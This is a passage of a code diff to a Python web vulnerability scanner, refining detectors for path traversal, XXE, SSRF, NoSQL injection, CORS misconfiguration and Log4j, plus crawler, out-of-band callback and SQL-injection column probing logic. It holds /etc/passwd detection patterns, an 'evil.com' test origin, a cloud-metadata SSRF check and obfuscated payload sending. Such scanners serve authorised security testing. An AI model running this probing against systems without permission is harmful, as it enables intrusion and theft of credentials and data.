+        Enhanced to normalize dynamic values (timestamps, UUIDs, random tokens).
         """
         import json
         import re
@@ -16160,13 +19002,34 @@ class Detector:
         # Dynamic token regex pattern - matches keys containing any of these patterns
         DYNAMIC_KEY_PATTERN = r'(_at|_id|_ts|exp|nonce|csrf|session|jwt|uuid|guid|trace|span)'
         
+        # Dynamic value patterns - matches common dynamic values
+        DYNAMIC_VALUE_PATTERNS = [
+            r'\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}',  # ISO 8601 timestamps
+            r'\d{4}-\d{2}-\d{2}',  # Date format
+            r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',  # UUIDs
+            r'[0-9a-f]{32}',  # 32-char hex strings
+            r'[0-9a-zA-Z]{20,}',  # Long random strings (tokens, session IDs)
+            r'token_[a-f0-9]+',  # Token patterns
+            r'sess_[a-f0-9]+',  # Session patterns
+        ]
+        
         def is_dynamic_key(key: str) -> bool:
             """Check if key matches dynamic token pattern"""
             return bool(re.search(DYNAMIC_KEY_PATTERN, key.lower()))
         
+        def normalize_dynamic_value(value: str) -> str:
+            """Normalize dynamic values to reduce false positives"""
+            if not isinstance(value, str):
+                return value
+            
+            for pattern in DYNAMIC_VALUE_PATTERNS:
+                if re.search(pattern, value):
+                    return "[DYNAMIC_VALUE]"
+            return value
+        
         def normalize_json(obj, depth=0):
             """
-            Recursively normalize JSON by removing dynamic keys and computing structural hash.
+            Recursively normalize JSON by removing dynamic keys and normalizing dynamic values.
             Returns a normalized object that can be compared structurally.
             """
             if depth > 50:  # Prevent infinite recursion
@@ -16176,11 +19039,16 @@ class Detector:
                 for key, value in obj.items():
                     if is_dynamic_key(key):
                         continue  # Skip dynamic keys
+                    # Normalize dynamic values
+                    if isinstance(value, str):
+                        value = normalize_dynamic_value(value)
                     normalized[key] = normalize_json(value, depth + 1)
                 return normalized
             elif isinstance(obj, list):
                 return [normalize_json(item, depth + 1) for item in obj]
-            elif isinstance(obj, (int, float, bool, str)):
+            elif isinstance(obj, str):
+                return normalize_dynamic_value(obj)
+            elif isinstance(obj, (int, float, bool)):
                 return obj
             else:
                 return None
@@ -16255,6 +19123,7 @@ class Detector:
                         vals2 = value_pattern.findall(h2)
                         if vals1 != vals2:
                             differences.append(f"Hidden field value changed: {vals1} -> {vals2}")
+        
         bool_patterns = [
             r'isAdmin["\s]*[:=]["\s]*(true|false)',
             r'authenticated["\s]*[:=]["\s]*(true|false)',
@@ -16267,6 +19136,7 @@ class Detector:
             matches2 = re.findall(pattern, html2, re.IGNORECASE) if html2 else []
             if matches1 != matches2:
                 differences.append(f"Boolean flag pattern changed: {pattern} - {matches1} -> {matches2}")
+        
         if differences:
             # Small differences are medium strength evidence
             confidence = calculate_evidence_based_confidence(
@@ -16286,17 +19156,48 @@ class Detector:
         return None
     @staticmethod
     def path_traversal(html: str, baseline_html: Optional[str]) -> Optional[Dict[str, Any]]:
-        if PASSWD_PATTERN.search(html):
-            if baseline_html and PASSWD_PATTERN.search(baseline_html): return None
-            # Password file pattern is strong evidence
+        # Check for enhanced /etc/passwd pattern first (requires multiple entries)
+        if ETC_PASSWD_FULL_PATTERN.search(html):
+            if baseline_html and ETC_PASSWD_FULL_PATTERN.search(baseline_html): 
+                return None
+            # High confidence - multiple /etc/passwd entries detected
             confidence = calculate_evidence_based_confidence(
-                evidence_strength='high',
+                evidence_strength='critical',
                 baseline_excluded=True,
-                multiple_confirmations=False,
+                multiple_confirmations=True,
                 specificity='high',
                 false_positive_resistance='high'
             )
-            return {"type":"PathTraversal","confidence":confidence,"evidence":Detector._extract(html,PASSWD_PATTERN)}
+            return {"type":"PathTraversal","confidence":confidence,"evidence":Detector._extract(html,ETC_PASSWD_FULL_PATTERN)}
+        
+        # Fall back to single pattern but require additional validation
+        if PASSWD_PATTERN.search(html):
+            if baseline_html and PASSWD_PATTERN.search(baseline_html): 
+                return None
+            
+            # Count how many passwd-like patterns are present
+            matches = PASSWD_PATTERN.findall(html)
+            if len(matches) >= 2:
+                # Multiple matches increase confidence
+                confidence = calculate_evidence_based_confidence(
+                    evidence_strength='high',
+                    baseline_excluded=True,
+                    multiple_confirmations=True,
+                    specificity='high',
+                    false_positive_resistance='high'
+                )
+                return {"type":"PathTraversal","confidence":confidence,"evidence":Detector._extract(html,PASSWD_PATTERN)}
+            elif len(matches) == 1:
+                # Single match - lower confidence to reduce false positives
+                confidence = calculate_evidence_based_confidence(
+                    evidence_strength='moderate',
+                    baseline_excluded=True,
+                    multiple_confirmations=False,
+                    specificity='medium',
+                    false_positive_resistance='high'
+                )
+                return {"type":"PathTraversal","confidence":confidence,"evidence":Detector._extract(html,PASSWD_PATTERN)}
+        
         return None
     
     @staticmethod
@@ -16407,17 +19308,70 @@ class Detector:
         return None
     @staticmethod
     def xxe(html, baseline_html):
-        if PASSWD_PATTERN.search(html):
-            if baseline_html and PASSWD_PATTERN.search(baseline_html): return None
-            # Password file pattern via XXE is strong evidence
+        import re
+        # File-based XXE detection
+        # Check for enhanced /etc/passwd pattern first (requires multiple entries)
+        if ETC_PASSWD_FULL_PATTERN.search(html):
+            if baseline_html and ETC_PASSWD_FULL_PATTERN.search(baseline_html): 
+                return None
+            # High confidence - multiple /etc/passwd entries detected via XXE
             confidence = calculate_evidence_based_confidence(
-                evidence_strength='high',
+                evidence_strength='critical',
                 baseline_excluded=True,
-                multiple_confirmations=False,
+                multiple_confirmations=True,
                 specificity='high',
                 false_positive_resistance='high'
             )
-            return {"type":"XXE","confidence":confidence,"evidence":Detector._extract(html,PASSWD_PATTERN)}
+            return {"type":"XXE","confidence":confidence,"evidence":Detector._extract(html,ETC_PASSWD_FULL_PATTERN)}
+        
+        # Fall back to single pattern but require additional validation
+        if PASSWD_PATTERN.search(html):
+            if baseline_html and PASSWD_PATTERN.search(baseline_html): 
+                return None
+            
+            # Count how many passwd-like patterns are present
+            matches = PASSWD_PATTERN.findall(html)
+            if len(matches) >= 2:
+                # Multiple matches increase confidence
+                confidence = calculate_evidence_based_confidence(
+                    evidence_strength='high',
+                    baseline_excluded=True,
+                    multiple_confirmations=True,
+                    specificity='high',
+                    false_positive_resistance='high'
+                )
+                return {"type":"XXE","confidence":confidence,"evidence":Detector._extract(html,PASSWD_PATTERN)}
+            elif len(matches) == 1:
+                # Single match - lower confidence to reduce false positives
+                confidence = calculate_evidence_based_confidence(
+                    evidence_strength='moderate',
+                    baseline_excluded=True,
+                    multiple_confirmations=False,
+                    specificity='medium',
+                    false_positive_resistance='high'
+                )
+                return {"type":"XXE","confidence":confidence,"evidence":Detector._extract(html,PASSWD_PATTERN)}
+        
+        # Error-based XXE detection (for blind XXE when OOB is blocked)
+        error_patterns = [
+            r'XML.*error|parse.*error|DTD.*error|entity.*error',
+            r'failed.*external|external.*entity|parameter.*entity',
+            r'connection.*refused|network.*error|DNS.*error',
+            r'file.*not.*found|no.*such.*file|access.*denied',
+        ]
+        
+        for pattern in error_patterns:
+            if re.search(pattern, html, re.IGNORECASE):
+                if baseline_html and not re.search(pattern, baseline_html, re.IGNORECASE):
+                    confidence = calculate_evidence_based_confidence(
+                        evidence_strength='medium',
+                        baseline_excluded=True,
+                        multiple_confirmations=False,
+                        specificity='medium',
+                        false_positive_resistance='medium'
+                    )
+                    return {"type":"XXE (Error-based)","confidence":confidence,"evidence":f"XML parsing error detected: {re.search(pattern, html, re.IGNORECASE).group()}"}
+        
         return None
     @staticmethod
     def crlf(resp: Any, baseline_resp: Optional[Any]) -> Optional[Dict[str, Any]]:
@@ -16464,7 +19418,15 @@ class Detector:
             return {"type":"SSRF (File)","confidence":confidence,"evidence":Detector._extract(html,"root:x:0:0")}
         
         # Use persistent callback waiting for OOB detection
-        callback_result = wait_for_oob_callback(sent_marker, timeout_seconds=30, check_interval=0.5)
+        # Run async callback wait in event loop since this is called from sync context
+        try:
+            loop = asyncio.get_event_loop()
+            if loop.is_running():
+                callback_result = wait_for_oob_callback(sent_marker, timeout_seconds=30, check_interval=0.5)
+            else:
+                callback_result = loop.run_until_complete(wait_for_oob_callback_async(sent_marker, timeout_seconds=30, check_interval=0.5))
+        except RuntimeError:
+            callback_result = wait_for_oob_callback(sent_marker, timeout_seconds=30, check_interval=0.5)
         if callback_result:
             # OOB callback is critical evidence
             confidence = calculate_evidence_based_confidence(
@@ -16478,9 +19440,13 @@ class Detector:
         return None
     @staticmethod
     def nosqli(html, baseline_html, payload):
-        if "true" in html.lower() and "return true" in payload.lower():
+        # Enhanced NoSQL detection with multiple patterns
+        payload_lower = payload.lower()
+        html_lower = html.lower()
+        
+        # Boolean-based detection
+        if "true" in html_lower and "return true" in payload_lower:
             if baseline_html and "true" in baseline_html.lower(): return None
-            # Boolean true is medium strength evidence
             confidence = calculate_evidence_based_confidence(
                 evidence_strength='medium',
                 baseline_excluded=True,
@@ -16489,6 +19455,44 @@ class Detector:
                 false_positive_resistance='low'
             )
             return {"type":"NoSQLi","confidence":confidence,"evidence":"Boolean true"}
+        
+        # JavaScript function injection detection
+        if "function()" in payload_lower and ("password" in html_lower or "admin" in html_lower):
+            if baseline_html and ("password" in baseline_html.lower() or "admin" in baseline_html.lower()): return None
+            confidence = calculate_evidence_based_confidence(
+                evidence_strength='medium',
+                baseline_excluded=True,
+                multiple_confirmations=False,
+                specificity='medium',
+                false_positive_resistance='low'
+            )
+            return {"type":"NoSQLi","confidence":confidence,"evidence":"JavaScript function injection"}
+        
+        # Aggregation pipeline detection
+        if "$lookup" in payload_lower or "$project" in payload_lower:
+            if "result" in html_lower or "project" in html_lower:
+                if baseline_html and ("result" in baseline_html.lower() or "project" in baseline_html.lower()): return None
+                confidence = calculate_evidence_based_confidence(
+                    evidence_strength='medium',
+                    baseline_excluded=True,
+                    multiple_confirmations=False,
+                    specificity='medium',
+                    false_positive_resistance='low'
+                )
+                return {"type":"NoSQLi","confidence":confidence,"evidence":"Aggregation pipeline injection"}
+        
+        # Query syntax confusion detection
+        if "[$ne]" in payload_lower or "[$regex]" in payload_lower:
+            if baseline_html and "[$ne]" in baseline_html.lower(): return None
+            confidence = calculate_evidence_based_confidence(
+                evidence_strength='medium',
+                baseline_excluded=True,
+                multiple_confirmations=False,
+                specificity='medium',
+                false_positive_resistance='low'
+            )
+            return {"type":"NoSQLi","confidence":confidence,"evidence":"Query syntax confusion"}
+        
         return None
     @staticmethod
     def ldapi(html: str, baseline_html: Optional[str], payload: str) -> Optional[Dict[str, Any]]:
@@ -16539,13 +19543,14 @@ class Detector:
         1. Sends Origin header with GET request to actual resource (not just OPTIONS)
         2. Checks Vary: Origin header for proper CORS implementation
         3. Verifies if reflected ACAO matches exact sent origin (not just wildcard)
+        4. Tests for null origin misconfiguration (common in enterprise environments)
         """
         test_origin = "https://evil.com"
         
         try:
             # Test 1: GET request with Origin header (main resource access)
             headers = {"Origin": test_origin}
-            resp = session.get(url, headers=headers, timeout=5)
+            resp = session.get(url, headers=headers, timeout=DEFAULT_HEALTH_CHECK_TIMEOUT)
             acao = resp.headers.get("Access-Control-Allow-Origin", "")
             vary_header = resp.headers.get("Vary", "")
             
@@ -16606,6 +19611,30 @@ class Detector:
                             "confidence":confidence
                         }
             
+            # Test 2: Null origin test (common enterprise misconfiguration)
+            try:
+                null_headers = {"Origin": "null"}
+                null_resp = session.get(url, headers=null_headers, timeout=DEFAULT_HEALTH_CHECK_TIMEOUT)
+                null_acao = null_resp.headers.get("Access-Control-Allow-Origin", "")
+                
+                if null_acao == "null":
+                    confidence = calculate_evidence_based_confidence(
+                        evidence_strength='high',
+                        baseline_excluded=True,
+                        multiple_confirmations=False,
+                        specificity='high',
+                        false_positive_resistance='medium'
+                    )
+                    return {
+                        "type":"CORS Misconfiguration",
+                        "url":url,
+                        "evidence":f"ACAO: null (null origin reflection)",
+                        "severity":"Medium",
+                        "confidence":confidence
+                    }
+            except Exception as e:
+                logging.debug(f"Null origin test error: {e}")
+            
             # Test 2: OPTIONS preflight request (additional verification)
             try:
                 options_headers = {
@@ -16613,7 +19642,7 @@ class Detector:
                     "Access-Control-Request-Method": "GET",
                     "Access-Control-Request-Headers": "Authorization, Content-Type"
                 }
-                options_resp = session.options(url, headers=options_headers, timeout=5)
+                options_resp = session.options(url, headers=options_headers, timeout=DEFAULT_HEALTH_CHECK_TIMEOUT)
                 acao_options = options_resp.headers.get("Access-Control-Allow-Origin", "")
                 acac_options = options_resp.headers.get("Access-Control-Allow-Credentials", "")
                 
@@ -16754,7 +19783,15 @@ class Detector:
     @staticmethod
     def log4j(html, payload, oob_results, marker):
         # Use persistent callback waiting for Log4j OOB detection
-        callback_result = wait_for_oob_callback(marker, timeout_seconds=30, check_interval=0.5)
+        # Run async callback wait in event loop since this is called from sync context
+        try:
+            loop = asyncio.get_event_loop()
+            if loop.is_running():
+                callback_result = wait_for_oob_callback(marker, timeout_seconds=30, check_interval=0.5)
+            else:
+                callback_result = loop.run_until_complete(wait_for_oob_callback_async(marker, timeout_seconds=30, check_interval=0.5))
+        except RuntimeError:
+            callback_result = wait_for_oob_callback(marker, timeout_seconds=30, check_interval=0.5)
         if callback_result:
             # OOB callback for Log4j is critical evidence
             confidence = calculate_evidence_based_confidence(
@@ -16900,7 +19937,15 @@ class Detector:
         if any(pattern in payload.lower() for pattern in xss_patterns):
             if resp.status == 200 or resp.status == 201:
                 # Use persistent callback waiting for OOB detection
-                callback_result = wait_for_oob_callback(marker, timeout_seconds=30, check_interval=0.5)
+                # Run async callback wait in event loop since this is called from sync context
+                try:
+                    loop = asyncio.get_event_loop()
+                    if loop.is_running():
+                        callback_result = wait_for_oob_callback(marker, timeout_seconds=30, check_interval=0.5)
+                    else:
+                        callback_result = loop.run_until_complete(wait_for_oob_callback_async(marker, timeout_seconds=30, check_interval=0.5))
+                except RuntimeError:
+                    callback_result = wait_for_oob_callback(marker, timeout_seconds=30, check_interval=0.5)
                 if callback_result:
                     confidence = calculate_evidence_based_confidence(
                         evidence_strength='critical',
@@ -16933,7 +19978,7 @@ class Detector:
                     found_elsewhere = False
                     
                     try:
-                        soup = BeautifulSoup(resp_text, 'html.parser')
+                        soup = get_cached_soup(resp_text, 'html.parser')
                         for elem in soup.find_all():
                             # Check value attributes
                             if elem.get('value') and payload in elem.get('value'):
@@ -17454,21 +20499,37 @@ class CrawlerEngine:
             content_hash = hashlib.md5(html.encode()).hexdigest()
             self.url_storage.add_crawled_page(url, content_hash, html_path, depth, status_code)
             
-            # Keep small cache of recent pages
+            # Keep small cache of recent pages with metadata only (no HTML)
             if len(self.crawled_pages_cache) < 100:
                 self.crawled_pages_cache.append({
                     'url': url,
-                    'html': html[:10000],  # Store truncated HTML in cache
+                    'html_path': html_path,
                     'depth': depth,
                     'status_code': status_code
                 })
         else:
+            # Even in in-memory mode, store HTML to disk to be consistent
+            html_path = f"html_cache/{hashlib.md5(url.encode()).hexdigest()}.html"
+            os.makedirs(os.path.dirname(html_path), exist_ok=True)
+            with open(html_path, 'w', encoding='utf-8') as f:
+                f.write(html)
+            
+            content_hash = hashlib.md5(html.encode()).hexdigest()
             self.crawled_pages.append({
                 'url': url,
-                'html': html,
+                'html_path': html_path,
                 'depth': depth,
                 'status_code': status_code
             })
+    
+    def _get_html_content(self, url: str) -> Optional[str]:
+        """Retrieve HTML content for a crawled page from disk"""
+        html_path = f"html_cache/{hashlib.md5(url.encode()).hexdigest()}.html"
+        try:
+            with open(html_path, 'r', encoding='utf-8') as f:
+                return f.read()
+        except (FileNotFoundError, IOError):
+            return None
     
     def _get_crawled_pages_iterator(self):
         """Get iterator over crawled pages (handles pagination for disk storage)"""
@@ -17481,19 +20542,20 @@ class CrawlerEngine:
                 if not pages:
                     break
                 for page in pages:
-                    # Load HTML from disk if needed
-                    if page.get('html_path') and os.path.exists(page['html_path']):
-                        try:
-                            with open(page['html_path'], 'r', encoding='utf-8') as f:
-                                page['html'] = f.read()
-                        except Exception as e:
-                            logging.warning(f"Failed to load HTML from disk: {e}")
-                            page['html'] = ''
+                    # Load HTML content from disk on demand
+                    html_content = self._get_html_content(page['url'])
+                    page['html'] = html_content if html_content else ''
                     yield page
                 offset += limit
         else:
-            # Return simple iterator for memory storage
+            # Return simple iterator for memory storage with HTML loading
             for page in self.crawled_pages:
+                # Load HTML from disk if needed
+                if 'html_path' in page and not page.get('html'):
+                    html_content = self._get_html_content(page['url'])
+                    page['html'] = html_content if html_content else ''
+                elif not page.get('html'):
+                    page['html'] = ''
                 yield page
     
     def _add_parameter(self, url: str, method: str, param: str, param_type: str) -> None:
@@ -17688,6 +20750,15 @@ class CrawlerEngine:
         if not any(p['url']==url and p['method']==method and p['param']==param for p in self.parameters):
             self.parameters.append({'url':url,'method':method,'param':param,'type':ptype})
 
+    def close(self):
+        """Close database connection to prevent resource leaks."""
+        if self.use_disk_storage and self.url_storage:
+            try:
+                self.url_storage.close()
+                logging.info("CrawlerEngine: Disk-based URL storage closed")
+            except Exception as e:
+                logging.warning(f"Error closing URL storage in CrawlerEngine: {e}")
+
 # ---------------------------------------------------------------------
 # SESSION MANAGER
 # ---------------------------------------------------------------------
@@ -17800,7 +20871,7 @@ class SessionManager:
     async def cleanup_cache(self) -> int:
         """Clean up expired cache entries. Returns number of entries removed."""
         return await self.request_cache.cleanup_expired()
-    async def fetch(self, url: str, method: str = 'GET', data: Optional[Dict[str, Any]] = None, json_data: Optional[Dict[str, Any]] = None, headers: Optional[Dict[str, str]] = None, allow_redirects: bool = False, use_cache: bool = True, session_manager: SessionStateManager = None, session_id: str = None, cookies: Optional[Dict[str, str]] = None) -> Optional[Any]:
+    async def fetch(self, url: str, method: str = 'GET', data: Optional[Dict[str, Any]] = None, json_data: Optional[Dict[str, Any]] = None, headers: Optional[Dict[str, str]] = None, allow_redirects: bool = True, use_cache: bool = True, session_manager: SessionStateManager = None, session_id: str = None, cookies: Optional[Dict[str, str]] = None) -> Optional[Any]:
         """
         Fetch URL with optional caching support and CSRF token extraction.
         
@@ -18002,17 +21073,13 @@ class OOBManager:
         self.cleanup_thread: Optional[threading.Thread] = None
         self.cleanup_stop_event = threading.Event()
     async def setup(self) -> None:
-        # Implement Interactsh fallback for OOB
         try:
-            from interactsh import InteractshClient
-            self.interactsh = InteractshClient()
-            logging.info("Using public Interactsh collaborator for OOB fallback")
-        except ImportError:
-            logging.warning("Interactsh not installed - relying on local OOB server")
-            self.interactsh = None
-        
-        self.oob_server, self.oob_port = start_oob_server()
-        logging.info(f"OOB HTTP: {self.public_ip}:{self.oob_port}")
+            self.oob_server, self.oob_port = start_oob_server()
+            logging.info(f"OOB HTTP: {self.public_ip}:{self.oob_port}")
+        except Exception as e:
+            logging.error(f"Failed to start OOB server: {e}")
+            self.oob_server = None
+            self.oob_port = None
         
         # Start cleanup thread for expired markers
         self.cleanup_stop_event.clear()
@@ -18030,16 +21097,21 @@ class OOBManager:
             if self.dns_oob_listener.start():
                 logging.info("DNS OOB listener started")
             
-            self.https_oob_server, self.https_oob_port = start_https_oob_server()
-            if self.https_oob_server:
-                logging.info(f"OOB HTTPS: {self.public_ip}:{self.https_oob_port}")
+            try:
+                self.https_oob_server, self.https_oob_port = start_https_oob_server()
+                if self.https_oob_server:
+                    logging.info(f"OOB HTTPS: {self.public_ip}:{self.https_oob_port}")
+            except Exception as e:
+                logging.error(f"Failed to start HTTPS OOB server: {e}")
+                self.https_oob_server = None
+                self.https_oob_port = None
     
     def _cleanup_loop(self):
         """Background thread to clean up expired markers"""
         while not self.cleanup_stop_event.is_set():
             try:
                 cleanup_expired_markers()
-                self.cleanup_stop_event.wait(timeout=5)  # Check every 5 seconds
+                self.cleanup_stop_event.wait(timeout=DEFAULT_HEALTH_CHECK_TIMEOUT)  # Check every 5 seconds
             except Exception as e:
                 logging.warning(f"OOB cleanup thread error: {e}")
     def stop(self) -> None:
@@ -18408,7 +21480,7 @@ class HeuristicRegressionOracle:
                 start_time = time.time()
                 resp = await self.session_manager.fetch(
                     url, method=method, data=data, json_data=json_data,
-                    headers=headers, allow_redirects=False, use_cache=False
+                    headers=headers, allow_redirects=True, use_cache=False
                 )
                 elapsed = time.time() - start_time
                 
@@ -18488,7 +21560,7 @@ class HeuristicRegressionOracle:
                 start_time = time.time()
                 resp = await self.session_manager.fetch(
                     url, method=method, data=data, json_data=json_data,
-                    headers=headers, allow_redirects=False, use_cache=False
+                    headers=headers, allow_redirects=True, use_cache=False
                 )
                 elapsed = time.time() - start_time
                 
@@ -18661,6 +21733,20 @@ class HeuristicRegressionOracle:
             logging.error(f"HeuristicRegressionOracle: Failed to get recent anomalies: {e}")
             return []
 
+    def close(self):
+        """Close database connection to prevent resource leaks."""
+        # HeuristicRegressionOracle uses short-lived connections that are closed immediately
+        # This method is provided for consistency with other cleanup patterns
+        try:
+            # Log statistics before closing
+            anomaly_count = self.get_anomaly_count()
+            recent_anomalies = self.get_recent_anomalies(limit=5)
+            logging.info(f"HeuristicRegressionOracle: Total confirmed anomalies: {anomaly_count}")
+            if recent_anomalies:
+                logging.info(f"HeuristicRegressionOracle: Recent anomalies: {recent_anomalies}")
+        except Exception as e:
+            logging.warning(f"HeuristicRegressionOracle: Error during cleanup: {e}")
+
 # ---------------------------------------------------------------------
 # INJECTION ENGINE
 # ---------------------------------------------------------------------
@@ -18761,6 +21847,11 @@ class InjectionEngine:
         # Initialize injection points tracking for second-order verification
         self.injection_points = []
         
+        # Initialize FSM-aware testing components
+        self.business_logic_fsm = getattr(scanner, 'business_logic_fsm', None)
+        self.fsm_aware_testing_enabled = getattr(scanner, 'fsm_aware_testing_enabled', True)
+        self.spa_route_discovery_enabled = getattr(scanner, 'spa_route_discovery_enabled', True)
+        
         # Initialize false positive database
         try:
             self.fp_db = FP_Database(config=config)
@@ -18781,23 +21872,33 @@ class InjectionEngine:
     def update_progress(self, current, total):
         self.reporting_engine.update_progress(current, total)
     async def close(self):
-        """Clean up resources including fp_db and heuristic oracle"""
+        """Clean up resources including fp_db, heuristic oracle, and scan state manager"""
         if self.fp_db:
             try:
                 await self.fp_db.close()
             except Exception as e:
                 logging.warning(f"Error closing FP database in InjectionEngine: {e}")
         
-        # Log heuristic oracle statistics before closing
+        # Close heuristic oracle
         if self.heuristic_oracle:
             try:
+                # Log statistics before closing
                 anomaly_count = self.heuristic_oracle.get_anomaly_count()
                 recent_anomalies = self.heuristic_oracle.get_recent_anomalies(limit=5)
                 logging.info(f"HeuristicRegressionOracle: Total confirmed anomalies: {anomaly_count}")
                 if recent_anomalies:
                     logging.info(f"HeuristicRegressionOracle: Recent anomalies: {recent_anomalies}")
+                # Close the oracle's database connection
+                self.heuristic_oracle.close()
             except Exception as e:
-                logging.warning(f"Error getting heuristic oracle statistics: {e}")
+                logging.warning(f"Error closing heuristic oracle in InjectionEngine: {e}")
+        
+        # Close scan state manager
+        if self.scan_state_manager:
+            try:
+                self.scan_state_manager.close()
+            except Exception as e:
+                logging.warning(f"Error closing scan state manager in InjectionEngine: {e}")
     async def _safe_request(self, method, url, **kwargs):
         """Make HTTP request using session manager"""
         try:
@@ -18868,7 +21969,7 @@ class InjectionEngine:
             # Use session manager's fetch method which includes caching and CSRF handling
             resp = await self.session_manager.fetch(
                 url, method=method, data=data, json_data=json_data, 
-                headers=headers, allow_redirects=False, use_cache=use_cache,
+                headers=headers, allow_redirects=True, use_cache=use_cache,
                 session_manager=session_manager, session_id=session_id, cookies=cookies
             )
             if resp:
@@ -18877,8 +21978,11 @@ class InjectionEngine:
                 resp._elapsed = getattr(resp, '_elapsed', 0)
                 return resp
             return None
+        except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError) as e:
+            logging.debug(f"Network error during async fetch for {url}: {e}")
+            return None
         except Exception as e:
-            logging.debug(f"Async fetch error for {url}: {e}")
+            logging.debug(f"Unexpected error during async fetch for {url}: {e}", exc_info=True)
             return None
     async def run_tests(self):
         # Initialize taint tracking if enabled and available from scanner
@@ -18972,7 +22076,9 @@ class InjectionEngine:
         tasks = []
         self.total_tasks = param_count
         for i, param in enumerate(self.crawler_engine.parameters):
-            tasks.append(asyncio.ensure_future(self._test_param(param)))
+            task = asyncio.ensure_future(self._test_param(param))
+            task.add_done_callback(lambda t: logging.error(f"Parameter test failed: {t.exception()}") if t.exception() else None)
+            tasks.append(task)
             self.current_task = i + 1
             self.update_progress(self.current_task, self.total_tasks)
             
@@ -19202,9 +22308,15 @@ class InjectionEngine:
                             logging.debug(f"No schema-aware mutations generated for {param['param']}, falling back to traditional payloads")
                     else:
                         logging.debug(f"Schema confidence too low ({schema['confidence']:.2f}) for {param['url']}, using traditional payloads")
+                except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError) as e:
+                    logging.error(f"Network error during schema-aware fuzzing for {param['url']}: {e}")
+                    # Fall back to traditional payloads on network error
+                except (KeyError, ValueError, TypeError) as e:
+                    logging.error(f"Data processing error during schema-aware fuzzing for {param['url']}: {e}")
+                    # Fall back to traditional payloads on data error
                 except Exception as e:
-                    logging.error(f"Schema-aware fuzzing failed for {param['url']}: {e}")
-                    # Fall back to traditional payloads on error
+                    logging.error(f"Unexpected error during schema-aware fuzzing for {param['url']}: {e}", exc_info=True)
+                    # Fall back to traditional payloads on unexpected error
             
             for vuln_type, payloads in PAYLOADS.items():
                 if isinstance(payloads, dict) or vuln_type in ("RequestSmuggling", "JWT", "Cloud", "RaceCondition"):
@@ -19254,18 +22366,23 @@ class InjectionEngine:
                                             logging.debug(f"[SAFETY] Payload blocked: {reason}")
                                             continue
                                     resp = await self._send_and_detect_with_corpus(param, vuln_type, variant, corpus_minimizer)
+                            except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError) as e:
+                                logging.debug(f"Network error during context-aware obfuscation, falling back to standard: {e}")
+                            except (KeyError, ValueError, TypeError) as e:
+                                logging.debug(f"Data processing error during context-aware obfuscation, falling back to standard: {e}")
                             except Exception as e:
-                                logging.debug(f"Context-aware obfuscation error, falling back to standard: {e}")
-                                # Fall back to standard obfuscation
-                                for variant in obfuscate(payload):
-                                    if self.stop_event.is_set(): return
-                                    # Apply maturity model safety check
-                                    if hasattr(self, 'maturity_model'):
-                                        allowed, reason = self.maturity_model.is_payload_allowed(variant, param.get('method', 'GET'), url)
-                                        if not allowed:
-                                            logging.debug(f"[SAFETY] Payload blocked: {reason}")
-                                            continue
-                                    resp = await self._send_and_detect_with_corpus(param, vuln_type, variant, corpus_minimizer)
+                                logging.debug(f"Unexpected error during context-aware obfuscation, falling back to standard: {e}", exc_info=True)
+                            
+                            # Fall back to standard obfuscation
+                            for variant in obfuscate(payload):
+                                if self.stop_event.is_set(): return
+                                # Apply maturity model safety check
+                                if hasattr(self, 'maturity_model'):
+                                    allowed, reason = self.maturity_model.is_payload_allowed(variant, param.get('method', 'GET'), url)
+                                    if not allowed:
+                                        logging.debug(f"[SAFETY] Payload blocked: {reason}")
+                                        continue
+                                resp = await self._send_and_detect_with_corpus(param, vuln_type, variant, corpus_minimizer)
                         else:
                             # Use standard obfuscation
                             for variant in obfuscate(payload):
@@ -19358,22 +22475,79 @@ class InjectionEngine:
                 
                 logging.warning(f"HeuristicRegressionOracle: Confirmed anomaly saved for {url} "
                               f"(payload: {payload[:50]}...)")
+                
+                # Add anomaly as a finding to the vulnerabilities list
+                await self._add_vulnerability({
+                    "type": "Heuristic Regression Anomaly",
+                    "url": url,
+                    "parameter": param.get('name', 'unknown'),
+                    "method": method,
+                    "payload": payload,
+                    "evidence": f"Confirmed anomaly: {status_code} error reproducible in regression testing. "
+                              f"Response time: {elapsed:.3f}s. Payload triggered consistent server error.",
+                    "severity": "Medium",
+                    "confidence": 90,
+                    "cwe": "CWE-754",  # Improper Check for Unusual or Exceptional Conditions
+                    "raw_request": self._build_raw_request_for_storage(method, url, param.get('headers', {}), payload),
+                    "request_headers": param.get('headers', {})
+                })
             
             # Continue with existing detection logic
             if vuln_type == "SSRF" and "169.254.169.254" in payload:
                 await self._test_imdsv2_ssrf(url)
             
             if vuln_type == "SQLi" and "ORDER BY" in payload:
+                # Binary search for column count instead of linear brute-force
+                # Reduces requests from O(n) to O(log n)
                 results = []
                 last_test_html = ''
-                for order_num in range(1, 20):
-                    p = payload.replace("ORDER BY 1", f"ORDER BY {order_num}")
+                low, high = 1, 50  # Reasonable upper bound for column count
+                
+                # Binary search to find the column count
+                while low <= high:
+                    mid = (low + high) // 2
+                    p = payload.replace("ORDER BY 1", f"ORDER BY {mid}")
                     resp_test = await self._send_injection(param, p)
                     resp_baseline = await self._send_injection(param, "1")
+                    
                     if resp_test and resp_baseline:
                         diff = abs(len(resp_test._body) - len(resp_baseline._body))
-                        results.append((order_num, diff))
+                        results.append((mid, diff))
                         last_test_html = resp_test._body
+                        
+                        # If response differs, we found a valid column count
+                        if diff > 0:
+                            # Try to find the exact boundary
+                            # Check if mid-1 also has a difference
+                            if mid > 1:
+                                p_prev = payload.replace("ORDER BY 1", f"ORDER BY {mid-1}")
+                                resp_prev = await self._send_injection(param, p_prev)
+                                if resp_prev:
+                                    diff_prev = abs(len(resp_prev._body) - len(resp_baseline._body))
+                                    if diff_prev == 0:
+                                        # Found the exact column count
+                                        break
+                            # Otherwise, search lower half
+                            high = mid - 1
+                        else:
+                            # No difference, search higher half
+                            low = mid + 1
+                    else:
+                        # Request failed, stop search
+                        break
+                
+                # Fallback to linear search if binary search didn't find anything
+                if not results or all(diff == 0 for _, diff in results):
+                    results = []
+                    for order_num in range(1, 20):
+                        p = payload.replace("ORDER BY 1", f"ORDER BY {order_num}")
+                        resp_test = await self._send_injection(param, p)
+                        resp_baseline = await self._send_injection(param, "1")
+                        if resp_test and resp_baseline:
+                            diff = abs(len(resp_test._body) - len(resp_baseline._body))
+                            results.append((order_num, diff))
+                            last_test_html = resp_test._body
+                
